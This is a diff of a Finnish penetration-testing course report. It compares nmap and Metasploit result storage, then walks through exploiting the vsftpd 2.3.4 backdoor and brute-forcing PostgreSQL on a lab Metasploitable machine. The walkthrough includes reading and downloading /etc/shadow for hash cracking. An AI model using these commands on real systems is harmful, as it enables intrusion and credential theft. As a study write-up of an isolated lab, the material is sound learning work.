@@ -28,7 +28,7 @@
 
 Kävin tämän aiemmassa [raportissani](https://github.com/Karjiss/tunkeutumistestaus/blob/main/h2-DORA-the-Explora.md) läpi.
 
-Lähteenä käytin Nmapin omilla sivuilla olevaa kirjaa, joten uskoisin sen olevan luotettava. ([Lyon, G. 2009](https://nmap.org/book/man-host-discovery.html)).
+Lähteenä käytin Nmapin omilla sivuilla olevaa kirjaa, joten uskoisin sen olevan luotettava. ([Lyon, G. 2009a](https://nmap.org/book/man-host-discovery.html)).
 
 ```-sn``` on parametri, joka ei skannaa portteja isäntien etsimisen jälkeen. Se myös tulostaa vain isännät, jotka vastasivat viesteihin.
 
@@ -128,6 +128,172 @@ Exploitista saa enemmän tietoa, kun avaa hyökkäyksen komennolla: ```use explo
 
 
 EternalBlue on NSA:n luoma työkalu, jonka ryhmä "Shadow Brokers" varasti ja laittoi julkiseen jakoon.
-Eternalblue hyödyntää haavoittuvuutta ```SMBv1```-verkkoprotokollassa. Se pystyy lähettämään haitallista koodia kohteeseen ([Burdova, C. 2020](https://www.avast.com/c-eternalblue)).
+Eternalblue hyödyntää haavoittuvuutta ```SMBv1```-verkkoprotokollassa. Se pystyy lähettämään haitallista koodia kohteeseen ([Burdova, C. 2020](https://www.avast.com/c-eternalblue)). Työkalua on käyttänyt ainakin ```WannaCry```, mikä on ollut maailmanlaajuisesti uutisissa.
 
 ## e) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?
+
+Kokeilin nmapin omaa tallennusta porttiskannaamalla Metasploitable koneen komennolla: ```nmap -oA foo -A -T5 192.168.32.128```
+
+Skannauksen jälkeen etsin nmapin luomat tiedostot komennolla ```ls```
+
+<img width="739" height="149" alt="image" src="https://github.com/user-attachments/assets/50b0963b-af56-4f9b-9689-29fd48ea1152" />
+
+- Parametri ```-oA``` tulostaa skannauksen tulokset kolmeen eri muotoon: normaali luettava, XML ja Grepattava ([Lyon, G. 2009b](https://nmap.org/book/man-output.html)).
+
+Nmapin oma tallennusvaihtoehto on hyvä, kun et halua käyttää tietokantoja. Tiedostoja on myös helppo siirtää. XML tallennus myös mahdollistaa datan viennin johonkin työkaluun tarvittaessa.
+
+Metasploitin ```db_nmap``` tallennus on kätevä, sillä se tallentaa kaikki tiedot skanneista suoraan tietokantaan, mistä voit etsiä ja suodattaa tarvittavaa tietoa yksinkertaisesti. Voit myös käyttää tallennettuja tietoja suoraan hyökkäyksissä saman työkalun alla.
+
+## f) Murtaudu Metasploitablen vsftpd-palveluun
+
+Aloitin etsimällä tietokantaani tallennettuja tietoja ```FTP```-portista.
+
+Käynnistin tietokantani komennolla: ```systemctl start postgresql```(Terminaali on käynnissä root oikeuksilla, muussa tapauksessa lisää sudo komennon alkuun!)
+
+Tämän jälkeen metasploit framework aukeaa komennolla: ```msfconsole```
+
+<img width="579" height="126" alt="image" src="https://github.com/user-attachments/assets/65dcbbc8-7161-4285-8c71-64f7267cab81" />
+
+Tarkastin services tietokannasta FTP-version:
+
+<img width="810" height="177" alt="image" src="https://github.com/user-attachments/assets/d2c266a0-e5d8-4ba2-a455-a41d0f56a8bb" />
+
+- Versio "```vsftpd 2.3.4```" näkyy kuvassa maalattuna.
+
+Seuraavaksi kokeilin hakua: ```search vsftpd 2.3.4 type:exploit```
+
+<img width="1089" height="493" alt="image" src="https://github.com/user-attachments/assets/4a1a5377-3a95-42bb-b22f-5c59ad036fab" />
+
+- Löytyi 1 osuma exploittiin, joka sopisi tähän versioon!
+- Payloadin voi ottaa käyttöön komennoilla: ```use 0``` tai ```use exploit/unix/ftp/vsftpd_234_backdoor```.
+- ```use 0```-komento toimii siksi, että payoload on moduuli nro 0 haussa.
+
+
+Syötin komennon: ```use 0```
+
+<img width="660" height="77" alt="image" src="https://github.com/user-attachments/assets/e6c93b1e-36bf-4499-85de-80ec0ada5698" />
+
+Komennolla: ```info``` saan näkyviin payloadin tietoja, asetukset/parametrit, tekijät yms.
+
+<img width="892" height="522" alt="image" src="https://github.com/user-attachments/assets/f55be242-1e23-4ce2-977c-368ae7e58593" />
+
+- RHOSTS, eli kohde IP on määrittämättä.
+
+Määritin RHOSTS kohdeosoitteeksi komennolla: ```set RHOSTS 192.168.32.128```
+
+<img width="1017" height="356" alt="image" src="https://github.com/user-attachments/assets/5866a499-1b38-4fa4-90e0-4295ef720608" />
+
+- RHOSTS muuttui haluttuun IP-osoitteeseen.
+
+Ennen hyökkäystä varmistin, etten ole verkossa:
+
+<img width="302" height="251" alt="image" src="https://github.com/user-attachments/assets/34cf9f16-196f-4c74-bf7a-cfb90ba91b2b" />
+
+- All clear!
+
+Näin aikaisemmin mielenkiintoisen komennon "```help```" osiossa, kokeilin sitä: ```rcheck```
+
+<img width="1157" height="103" alt="image" src="https://github.com/user-attachments/assets/26d64d59-1d7f-4899-9274-3d6f84ee9840" />
+
+- MSF käynnistää siis moduulin uudestaan ja tarkistaa, onko (KOHDE IP) haavoittuva.
+- Tulosteen mukaan kyseinen FTP-versio on mahdollisesti haavoittuva.
+
+Ajan hyökkäyksen komennolla: ```exploit```
+
+<img width="673" height="30" alt="image" src="https://github.com/user-attachments/assets/279930f0-355c-450b-820d-4f75a193a2dc" />
+
+- Mitään ei tapahtunut, sillä unohdin määrittää "LHOST", eli hyökkääjän IP.
+
+Määritin LHOST kohdan komennolla: ```set -g LHOST 192.168.32.129```
+
+- Parametri -g tekee muutoksesta "globaalin", eli se on automaattisesti valittuna kaikissa moduuleissa.
+
+<img width="580" height="41" alt="image" src="https://github.com/user-attachments/assets/722fc2dc-b830-4b10-8442-89ad58c29f14" />
+
+Kokeilin ```exploit``` komentoa uudestaan:
+
+<img width="948" height="160" alt="image" src="https://github.com/user-attachments/assets/d1411fe1-0544-4a78-a068-7618be470388" />
+
+- We're in!
+
+Komennoilla: ```sysinfo``` ja ```getuid``` selvitin tietoa kohdekoneesta, sekä kohdekäyttäjän nimen.
+
+<img width="430" height="153" alt="image" src="https://github.com/user-attachments/assets/0cc21409-f631-464e-bb18-8ff75a05c802" />
+
+g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää
+
+Opin tunnilla, että ```/etc/shadow``` pitää sisällään salasanoja. Kokeilin salasanojen varastamista itse:
+
+Komennolla: ```cat /etc/shadow``` voin tulostaa kaikki salasanat
+
+<img width="565" height="477" alt="image" src="https://github.com/user-attachments/assets/e4864cb9-6322-4c08-a856-5dc642883672" />
+
+- Salasanat ovat hashatty, mutta murrettavissa esim hashcatilla!
+
+Latasin salasanat Kalille komennolla: ```download /etc/shadow```
+
+<img width="952" height="121" alt="image" src="https://github.com/user-attachments/assets/2c1fb1e2-b3b0-4e24-809f-5cce4c4498a3" />
+
+Salasanat murtamalla sinulla on pääsy kaikkiin käyttäjiin koneella, joten liikkuvuus olisi taattu!
+
+Myös komennoilla: ```arp``` ja ```route``` voi löytää tärkeää tietoa, esimerkiksi muista verkkoon liitetyistä laitteista johon voit saada pääsyn
+
+<img width="496" height="282" alt="image" src="https://github.com/user-attachments/assets/4e27a71a-a3f7-49f9-aa90-535bd2a9574c" />
+
+- Tässä labrassa ei löydy mitään, mutta oikeassa kohteessa voisit hyötyä erittäin paljon.
+
+h) Murtaudu Metasploitableen jollain toisella tavalla
+
+Tarkastelin ```services``` tietokantaa jälleen ja mielenkiintoinen havainto oli ```postgresql```. Jos sinne pääsisi, olisi käsissäni Metasploitablen tietokanta!
+
+Hain siis uutta payloadia Metasploitista komennolla: ```search postgresql```
+
+<img width="1161" height="595" alt="image" src="https://github.com/user-attachments/assets/082daa4f-591d-4028-817c-3b676bd49280" />
+
+- Löysin "postgreslogin" nimisen payloadin riviltä 26.
+
+Siirryin payloadiin komennolla: ```use 26``` ja avasin infon komennolla: ```info```
+
+<img width="1130" height="524" alt="image" src="https://github.com/user-attachments/assets/d720e6ac-b9d6-4ced-8bee-567657daff01" />
+
+- Työkalu käyttää oletusyhdistelmiä salasanoista ja käyttäjänimistä.
+- Paljon eri vaihtoehtoja käyttää, kuten ```STOP_ON_SUCCESS``` ja ```CreateSession```.
+
+<img width="555" height="96" alt="image" src="https://github.com/user-attachments/assets/12468905-3077-4468-bb8f-b0b7b72b166a" />
+
+- Työkalu siis yrittää päästä sisään bruteforce menetelmällä.
+
+Vaihdoin työkalun "asetuksia" haluamakseni:
+
+**RHOSTS** = ```set RHOSTS 192.168.32.128```
+**STOP_ON_SUCCESS** = ```set STOP_ON_SUCCESS true``` (Pysäyttää payloadin löytäessään oikean salasanan)
+**CreateSession** = ```set CreateSession true``` (Luo suoraan session, joka on yhdistetty tietokantaan)
+
+<img width="606" height="120" alt="image" src="https://github.com/user-attachments/assets/cd6c5305-ac6d-4dc0-af99-3c574857a66b" />
+
+Ajoin payloadin komennolla: ```run```
+
+<img width="1063" height="253" alt="image" src="https://github.com/user-attachments/assets/cdc2d154-b4b1-4ec2-afbc-8d8252296000" />
+
+- We're in once again!
+
+Seuraavaksi tarkastin ```sessions``` ja käytin komentoa: ```sessions -h``` saadakseni selville, miten pääsen yhteyteen käsiksi.
+
+<img width="1146" height="526" alt="image" src="https://github.com/user-attachments/assets/842f8d41-9895-4957-b641-d96302d2c7e1" />
+
+- Käynnissä oleva sessio näkyy.
+- Ohjeissa kerrotaan että komento: ```sessions -i (ID)``` päästää sessioon kiinni.
+
+Kokeilin ohjeessa olevaa komentoa: ```sessions -i 1```
+
+<img width="540" height="91" alt="image" src="https://github.com/user-attachments/assets/654d6c13-2fc7-4de2-8da4-ebda264c361c" />
+
+- Pääsin yhteyteen kiinni onnistuneesti.
+
+Tarkastelin ohjeita jälleen ```help``` komennolla:
+
+<img width="595" height="502" alt="image" src="https://github.com/user-attachments/assets/aa1bb102-9e67-4eb6-9afe-7e18af6a91ac" />
+
+- Esimerkiksi ```query``` komennolla voit syöttää SQL-kyselyitä.
+- Joku pätevä SQL-osaaja varmasti saisi tästä jotain enemmän irti.
+  
